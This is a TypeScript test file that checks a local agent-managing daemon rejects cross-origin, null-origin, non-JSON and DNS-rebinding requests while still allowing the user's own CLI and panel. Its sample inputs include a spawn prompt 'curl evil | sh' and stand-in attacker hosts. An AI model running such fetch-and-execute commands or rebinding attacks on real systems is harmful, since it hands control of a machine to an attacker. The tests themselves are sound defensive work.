import { describe, it, expect, afterEach } from 'vitest';
import { request } from 'node:http';
import { Hub } from '../src/hub.js';
import { serve, type Daemon } from '../src/daemon.js';
import { MemoryKV } from '../src/store.js';
import type { Agent } from '../src/agent.js';
import { isLoopbackHost, isSameOrigin } from '../src/daemon.js';

const T0 = Date.parse('2026-10-24T12:00:00.000Z');

let d: Daemon | null = null;
afterEach(async () => {
  if (d) await d.close();
  d = null;
});

async function start(): Promise<{ port: number; sent: string[]; spawned: string[][] }> {
  const sent: string[] = [];
  const spawned: string[][] = [];
  const agent: Agent = { sessionID: 'A', pid: 1, name: 'one', cwd: '/r', kind: 'interactive', status: 'idle', startedAt: T0, inboxSocketPath: '/tmp/a.sock' };
  const hub = new Hub({
    kv: new MemoryKV(),
    clock: () => T0,
    // Yields a macrotask: an instant sleep would turn the roster poll into a microtask spin that starves the event loop.
    sleep: () => new Promise<void>((r) => setTimeout(r, 5)),
    run: async (_cmd, args) => {
      spawned.push(args);
      return { code: 0, stdout: 'backgrounded · beef01 · x', stderr: '' };
    },
    listAgents: async () => [agent],
    sendInbox: async (_a, text) => void sent.push(text),
    readTail: async () => ({ turns: [], endOffset: 0, latestModel: null }),
    readSince: async () => ({ turns: [], endOffset: 0, latestModel: null }),
    settings: { claudePath: process.execPath, claudeDir: '/claude' },
  });
  await hub.refresh();
  d = await serve(hub, { port: 0, pollMs: 60_000 });
  return { port: Number(new URL(d.url).port), sent, spawned };
}

/** A raw request, so the Host and Origin headers can be set the way a browser or a rebinding attacker would. */
function raw(port: number, method: string, path: string, headers: Record<string, string>, body?: string): Promise<{ status: number; body: string }> {
  return new Promise((resolve, reject) => {
    const req = request({ host: '127.0.0.1', port, method, path, headers }, (res) => {
      let b = '';
      res.on('data', (c) => (b += c));
      res.on('end', () => resolve({ status: res.statusCode ?? 0, body: b }));
    });
    req.on('error', reject);
    if (body !== undefined) req.write(body);
    req.end();
  });
}

describe('the daemon refuses requests that did not come from the user’s own tools', () => {
  it('a cross-origin page cannot make a "simple" POST: text/plain with a foreign Origin is refused and nothing is sent', async () => {
    const { port, sent } = await start();
    const r = await raw(port, 'POST', '/agents/A/message', { host: `127.0.0.1:${port}`, origin: 'https://evil.example', 'content-type': 'text/plain' }, '{"text":"run this"}');
    expect(r.status).toBe(403);
    expect(sent).toEqual([]);
  });

  it('a foreign Origin is refused even with a JSON content type, and a spawn through it never launches claude', async () => {
    const { port, spawned } = await start();
    const r = await raw(port, 'POST', '/spawn', { host: `127.0.0.1:${port}`, origin: 'https://evil.example', 'content-type': 'application/json' }, JSON.stringify({ name: 'x', cwd: '/r', prompt: 'curl evil | sh' }));
    expect(r.status).toBe(403);
    expect(spawned).toEqual([]);
  });

  it('DNS rebinding: a request whose Host is not loopback is refused, reads included', async () => {
    const { port } = await start();
    for (const path of ['/health', '/state', '/agents']) {
      const r = await raw(port, 'GET', path, { host: `attacker.example:${port}` });
      expect(r.status).toBe(403);
      expect(r.body).not.toContain('"agents"');
    }
  });

  it('Origin: null (a sandboxed frame) is refused', async () => {
    const { port, sent } = await start();
    const r = await raw(port, 'POST', '/agents/A/message', { host: `127.0.0.1:${port}`, origin: 'null', 'content-type': 'application/json' }, '{"text":"x"}');
    expect(r.status).toBe(403);
    expect(sent).toEqual([]);
  });

  it('a state-changing request must declare JSON: anything else is 415', async () => {
    const { port, sent } = await start();
    for (const ct of ['text/plain', 'application/x-www-form-urlencoded', 'multipart/form-data; boundary=x']) {
      const r = await raw(port, 'POST', '/agents/A/message', { host: `127.0.0.1:${port}`, 'content-type': ct }, '{"text":"x"}');
      expect(r.status).toBe(415);
    }
    const none = await raw(port, 'POST', '/agents/A/message', { host: `127.0.0.1:${port}` }, '{"text":"x"}');
    expect(none.status).toBe(415);
    expect(sent).toEqual([]);
  });

  it('the user’s own tools still work: the CLI (no Origin), the panel (same-origin), localhost, and plain GETs', async () => {
    const { port, sent } = await start();
    const json = { 'content-type': 'application/json' };
    const cli = await raw(port, 'POST', '/agents/A/message', { host: `127.0.0.1:${port}`, ...json }, '{"text":"from the CLI"}');
    expect(cli.status).toBe(200);
    const panel = await raw(port, 'POST', '/agents/A/message', { host: `127.0.0.1:${port}`, origin: `http://127.0.0.1:${port}`, ...json }, '{"text":"from the panel"}');
    expect(panel.status).toBe(200);
    const local = await raw(port, 'POST', '/agents/A/message', { host: `localhost:${port}`, origin: `http://localhost:${port}`, ...json }, '{"text":"via localhost"}');
    expect(local.status).toBe(200);
    expect((await raw(port, 'GET', '/health', { host: `127.0.0.1:${port}` })).status).toBe(200);
    expect((await raw(port, 'GET', '/state', { host: `127.0.0.1:${port}`, origin: `http://127.0.0.1:${port}` })).status).toBe(200);
    expect(sent.filter((t) => t.includes('from the')).length + sent.filter((t) => t.includes('via localhost')).length).toBe(3);
  });

  it('a body-less POST from the CLI (refresh, pause) is fine with the JSON header', async () => {
    const { port } = await start();
    const r = await raw(port, 'POST', '/refresh', { host: `127.0.0.1:${port}`, 'content-type': 'application/json' });
    expect(r.status).toBe(200);
  });
});

describe('the host and origin checks', () => {
  it('accepts only loopback names as the Host', () => {
    for (const h of ['127.0.0.1:7433', 'localhost:7433', 'LOCALHOST', '[::1]:7433', '127.0.0.1']) expect(isLoopbackHost(h)).toBe(true);
    for (const h of ['evil.example:7433', '127.0.0.1.evil.example', 'localhost.evil.example:1', 'user@127.0.0.1:7433', '[::1', '', undefined, '0.0.0.0:7433', '192.168.1.5:7433']) expect(isLoopbackHost(h as string | undefined)).toBe(false);
  });
  it('accepts an Origin only when it is exactly this daemon\u2019s own', () => {
    expect(isSameOrigin('http://127.0.0.1:7433', '127.0.0.1:7433')).toBe(true);
    expect(isSameOrigin('HTTP://LocalHost:7433', 'localhost:7433')).toBe(true);
    for (const [o, h] of [
      ['http://localhost:3000', '127.0.0.1:7433'], // another local dev server
      ['http://localhost:7433', '127.0.0.1:7433'], // a different name for the same port
      ['https://127.0.0.1:7433', '127.0.0.1:7433'], // the daemon does not speak TLS
      ['null', '127.0.0.1:7433'],
      ['https://evil.example', '127.0.0.1:7433'],
      ['http://127.0.0.1.evil.example', '127.0.0.1:7433'],
      ['chrome-extension://abc', '127.0.0.1:7433'],
      ['http://evil.example:7433', 'evil.example:7433'], // a rebinding attacker agreeing with itself
    ] as const)
      expect(isSameOrigin(o, h)).toBe(false);
  });
});
